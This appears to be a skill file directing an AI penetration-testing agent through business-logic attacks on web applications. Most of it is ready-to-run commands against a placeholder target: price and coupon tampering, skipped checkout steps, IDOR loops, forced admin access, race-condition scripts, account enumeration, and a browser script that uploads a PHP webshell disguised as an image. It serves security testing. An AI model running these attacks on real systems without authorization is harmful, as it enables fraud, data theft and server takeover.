---
name: web-app-logic
description: Business logic vulnerability testing — price tampering, workflow bypass, race conditions, IDOR
allowed-tools: [Bash, Read, Write]
---

# Web Application Logic Testing

Test business logic flaws that automated scanners miss. Requires understanding the application flow.

## Reference

See `reference/business-logic-testing.md` and `reference/access-control.md`.

## Approach

Business logic testing is mostly manual. The coordinator must:
1. Map the application's workflows (checkout, transfer, profile update, etc.)
2. Design specific bypass attempts for each workflow
3. Direct executors with precise test cases

## Price / Value Tampering

```bash
# Intercept checkout and modify price
curl -s -X POST TARGET/api/checkout \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer $TOKEN" \
  -d '{"item_id": 100, "quantity": 1, "price": 0.01}'

# Negative quantity (results in refund)
curl -s -X POST TARGET/api/cart/add \
  -d '{"item_id": 100, "quantity": -1, "price": 99.99}'

# Currency manipulation
curl -s -X POST TARGET/api/checkout \
  -d '{"amount": 1, "currency": "USD"}' # test with other currencies
```

## Workflow Bypass (Skip Steps)

```bash
# Attempt to access step 3 without completing steps 1-2
curl -s TARGET/checkout/payment -H "Cookie: SESSION=valid_session"
curl -s TARGET/checkout/confirm -H "Cookie: SESSION=valid_session"  # skip payment

# Direct object access (bypassing multi-step wizard)
curl -s TARGET/admin/users -H "Cookie: SESSION=valid_session"
```

## Race Conditions

```bash
# Parallel requests — coupon double-spend, concurrent transfers
python3 - <<'EOF'
import threading, requests

TARGET = "https://target.com/api/coupon/redeem"
HEADERS = {"Authorization": "Bearer TOKEN", "Content-Type": "application/json"}
DATA = '{"coupon_code": "SAVE50"}'

def redeem():
    r = requests.post(TARGET, headers=HEADERS, data=DATA)
    print(f"{threading.current_thread().name}: {r.status_code} {r.text[:100]}")

threads = [threading.Thread(target=redeem, name=f"T{i}") for i in range(20)]
for t in threads: t.start()
for t in threads: t.join()
EOF
```

## IDOR via Parameter Manipulation

```bash
# Horizontal privilege escalation — access other users' data
MY_ID="123"
for id in $(seq 120 130); do
  curl -s "TARGET/api/orders/$id" -H "Authorization: Bearer $MY_TOKEN" | \
    grep -v "forbidden\|unauthorized\|not found" && echo "IDOR: /api/orders/$id"
done

# Change account ID in request
curl -s -X PUT TARGET/api/profile \
  -d '{"user_id": "456", "email": "attacker@evil.com"}'
```

## Forced Browsing

```bash
# Access functionality without going through the UI
curl -s TARGET/admin -H "Cookie: SESSION=regular_user_session"
curl -s TARGET/api/admin/users -H "Authorization: Bearer REGULAR_USER_TOKEN"

# Access reports without purchasing
curl -s TARGET/reports/financial-2024.pdf
curl -s TARGET/export/users.csv
```

## Discount / Coupon Logic

```bash
# Apply same coupon twice
curl -s -X POST TARGET/api/coupon/apply -d '{"code":"SAVE10"}' -H "Cookie: $SESSION"
curl -s -X POST TARGET/api/coupon/apply -d '{"code":"SAVE10"}' -H "Cookie: $SESSION"

# Combine exclusive coupons
curl -s -X POST TARGET/api/checkout \
  -d '{"coupons": ["SAVE10", "SAVE20", "FREESHIP"]}'
```

## Account Enumeration

```bash
# Different responses for valid vs invalid usernames
curl -s -X POST TARGET/forgot-password -d "email=admin@target.com" | head -3
curl -s -X POST TARGET/forgot-password -d "email=notexist@target.com" | head -3
# Same response? No enum. Different? Finding.

# Timing-based enum
time curl -s -X POST TARGET/api/login -d '{"username":"admin","password":"wrong"}' > /dev/null
time curl -s -X POST TARGET/api/login -d '{"username":"doesnotexist999","password":"wrong"}' > /dev/null
```

## Authenticated Multi-Step Workflow Testing (Playwright)

Use the `playwright` MCP server for workflows requiring real browser sessions.
See `skills/coordination/reference/playwright-guide.md` for full patterns and session capture.

```
# Setup: login and capture session
browser_launch()
browser_navigate(url="TARGET/login")
browser_fill(target="Email", value="test@example.com")
browser_fill(target="Password", value="TestPass!")
browser_click(target="Sign in")
browser_screenshot(name="00-logged-in", output_dir=OUTPUT_DIR)
browser_export_session(output_dir=OUTPUT_DIR)

# Test: skip payment step
browser_navigate(url="TARGET/checkout/cart")
browser_screenshot(name="10-cart", output_dir=OUTPUT_DIR)
browser_navigate(url="TARGET/checkout/confirm")   # jump directly to confirm
browser_screenshot(name="11-skip-payment-attempt", output_dir=OUTPUT_DIR)
page_content = browser_get_text()
# If order confirm page renders → FINDING: workflow bypass (High)

# Test: price tampering via JavaScript
browser_navigate(url="TARGET/product/123")
browser_evaluate(script="""
  // Attempt to modify price in DOM before form submit
  document.querySelectorAll('[name=price],[data-price],[class*=price]')
    .forEach(el => { el.value = '0.01'; el.textContent = '0.01'; });
  return 'modified';
""")
browser_click(target="Add to Cart")
browser_screenshot(name="12-price-tamper-dom", output_dir=OUTPUT_DIR)
```

## Race Condition Testing via Parallel Browser Tabs

```
# For race conditions requiring authenticated sessions (e.g. coupon double-spend)
# 1. Capture session cookies first
browser_launch()
browser_navigate(url="TARGET/login")
browser_fill(target="Email", value="test@example.com")
browser_fill(target="Password", value="TestPass!")
browser_click(target="Sign in")
session = browser_export_session(output_dir=OUTPUT_DIR)
browser_close()

# 2. Use exported cookies in parallel curl requests (faster than browser tabs)
SESSION=$(cat "$OUTPUT_DIR/artifacts/browser-session.json")
COOKIE=$(echo "$SESSION" | jq -r '[.cookies[] | "\(.name)=\(.value)"] | join("; ")')

python3 - << 'EOF'
import threading, requests

TARGET  = "https://target.com/api/coupon/redeem"
COOKIE  = "session=ABC; csrf=XYZ"   # from browser-session.json
HEADERS = {"Cookie": COOKIE, "Content-Type": "application/json"}
DATA    = '{"coupon_code": "SAVE50"}'

def redeem(n):
    r = requests.post(TARGET, headers=HEADERS, data=DATA, timeout=5)
    print(f"T{n}: {r.status_code} {r.text[:80]}")

threads = [threading.Thread(target=redeem, args=(i,)) for i in range(20)]
for t in threads: t.start()
for t in threads: t.join()
EOF
```

## File Upload Bypass via Browser (MIME Spoofing)

```
# Browser-based upload testing for MIME-validated endpoints
browser_launch()
browser_navigate(url="TARGET/login")
browser_fill(target="Email", value="test@example.com")
browser_fill(target="Password", value="TestPass!")
browser_click(target="Sign in")
browser_navigate(url="TARGET/profile/upload")
browser_screenshot(name="20-upload-page", output_dir=OUTPUT_DIR)

# Inject file via JavaScript (bypass accept= attribute restrictions)
browser_evaluate(script="""
  const input = document.querySelector('input[type=file]');
  if (input) {
    // Remove accept= restriction
    input.removeAttribute('accept');
    // Create a PHP webshell file as Blob
    const payload = '<?php system($_GET["cmd"]); ?>';
    const file = new File([payload], 'shell.php', {type: 'image/jpeg'});
    const dt = new DataTransfer();
    dt.items.add(file);
    input.files = dt.files;
    return 'file injected';
  }
  return 'no file input found';
""")
browser_click(target="Upload")
browser_screenshot(name="21-upload-result", output_dir=OUTPUT_DIR)
browser_get_text()
```

## Output

Each confirmed logic flaw → `OUTPUT_DIR/findings/finding-NNN/`
Browser screenshots → `OUTPUT_DIR/screenshots/` (numbered chronologically)
Browser session export → `OUTPUT_DIR/artifacts/browser-session.json`
Include PoC showing the specific bypass with before/after evidence.

---

## Deep-dive references (authoritative)

The inline sections above are **quick-start orchestration**. For real testing of any area below, the `reference/` file is the **source of truth** (curated from disclosed reports — payloads, bypass tables, chain templates). Load it before deep testing; don't rely on the quick-start commands alone.

- `reference/hunt-business-logic.md` — Deep BUSINESS LOGIC hunting — payloads, bypass tables, and disclosed-report chains.
- `reference/hunt-race-condition.md` — Deep RACE CONDITION hunting — payloads, bypass tables, and disclosed-report chains.
